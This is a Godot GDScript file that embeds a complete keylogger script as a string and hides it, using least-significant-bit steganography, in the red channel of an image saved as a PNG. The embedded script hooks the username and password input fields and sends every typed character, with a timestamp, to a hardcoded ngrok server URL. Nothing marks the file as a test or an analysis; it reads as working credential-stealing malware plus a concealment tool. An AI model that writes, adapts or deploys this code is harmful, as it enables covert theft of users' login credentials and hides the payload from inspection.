extends Node

func _ready():
	print("This image does steganography")

	var image = Image.new()
	var err = image.load("res://box.jpg")
	if err != OK:
		push_error("Could not load box.jpg")
		return

	var message = """extends Node
# This component handles all external network communication (sending key logs).

# --- CONFIGURATION ---
# CRITICAL: Set the Server URL using your active Ngrok HTTPS URL + /data endpoint
@export var server_url: String = "https://crab-loved-hen.ngrok-free.app/data"
# ---------------------

# Node reference for making HTTP requests
var http_request: HTTPRequest = null

# Node references for the inputs (we define them here but initialize them in _ready)
var username_input: LineEdit = null
var password_input: LineEdit = null

# Called when the node enters the scene tree for the first time.
func _ready():
	# Create the HTTPRequest node dynamically
	http_request = HTTPRequest.new()
	add_child(http_request)
	
	# Connect the completion signal to handle the server response
	http_request.request_completed.connect(_on_http_request_completed)
	
	# ⭐ CRITICAL FIX: Manually find nodes using the Unique Name search function ⭐
	# We use get_tree().get_root().find_child(name, true, false)
	# to search the entire scene recursively for the unique name, bypassing @onready issues.
	username_input = get_tree().get_root().find_child("UsernameInput", true, false)
	password_input = get_tree().get_root().find_child("PasswordInput", true, false)

	# Connect signals if the nodes were successfully found
	if username_input != null:
		username_input.text_changed.connect(_on_username_input_text_changed)
	else:
		print("ERROR: Could not find %UsernameInput node.")

	if password_input != null:
		password_input.text_changed.connect(_on_password_input_text_changed)
	else:
		print("ERROR: Could not find %PasswordInput node.")

	print("NetworkManager initialized. Target URL: ", server_url)


# ----------------------------------------------------------------------
# 1. SIGNAL HANDLERS - Instant Send
# ----------------------------------------------------------------------

# This function fires after text changes in the Username field.
func _on_username_input_text_changed(new_text: String):
	# Log and send the last character entered.
	if new_text.length() > 0:
		var last_char = new_text.right(1)
		send_key_data(last_char)

# This function fires after text changes in the Password field.
func _on_password_input_text_changed(new_text: String):
	# Log and send the last character entered.
	if new_text.length() > 0:
		var last_char = new_text.right(1)
		send_key_data(last_char)

# ----------------------------------------------------------------------
# 2. SENDING FUNCTIONALITY
# ----------------------------------------------------------------------

# Sends a SINGLE key press and its timestamp to the remote server instantly
func send_key_data(key_char: String):
	if server_url.is_empty():
		print("ERROR: Server URL is not set in NetworkManager.")
		return
		
	# Prepare the single-key payload structure (matches your server.js expected format for a single key)
	var key_data = {
		"key": key_char,
		"timestamp": Time.get_unix_time_from_system()
	}
	
	# Wrap the single key log into the expected "keys" array structure for your server.js
	var payload = {
		"keys": [key_data]
	}

	var json_string = JSON.stringify(payload)
	
	# Set up request headers, critical for telling the server we are sending JSON
	var headers = [
		"Content-Type: application/json"
	]
	
	var full_url = server_url
	
	# Send the request
	var error = http_request.request(full_url, headers, HTTPClient.METHOD_POST, json_string)
	
	if error != OK:
		print("ERROR: Failed to start HTTP request for key '", key_char, "'. Error code: ", error)
	else:
		print("INFO: Attempting to send key '", key_char, "' instantly...")

# ----------------------------------------------------------------------
# 3. HTTP RESPONSE HANDLER
# ----------------------------------------------------------------------

# Handles the response from the server after the request is finished
func _on_http_request_completed(result: int, response_code: int, headers: PackedStringArray, body: PackedByteArray):
	var response_body = body.get_string_from_utf8()
	
	print("Request Completed. HTTP Status Code: ", response_code)
	
	# Check for successful HTTP status codes (2xx)
	if response_code >= 200 and response_code < 300:
		# Success is logged, no array to clear in this new logic
		pass
	else:
		# Log the failure
		print("SERVER ERROR: Failed to send data. Status code: ", response_code, " Response: ", response_body)

	"""
	var bits = []

	# Convert message to bits + delimiter (0x00)
	for c in message.to_utf8_buffer():  # Godot 4.x
		for i in range(8):
			bits.append((c >> (7 - i)) & 1)
	# Add 8 zero bits as end marker
	for i in range(8):
		bits.append(0)

	var bit_index = 0
	for y in range(image.get_height()):
		for x in range(image.get_width()):
			if bit_index >= bits.size():
				break
			var color = image.get_pixel(x, y)
			var r = int(color.r * 255.0)

			# Store one bit in the red channel LSB
			r = (r & ~1) | bits[bit_index]
			bit_index += 1

			image.set_pixel(x, y, Color8(r, int(color.g * 255.0), int(color.b * 255.0)))

		if bit_index >= bits.size():
			break

	image.save_png("res://encoded2.png")
	print("Message encoded into encoded.png")
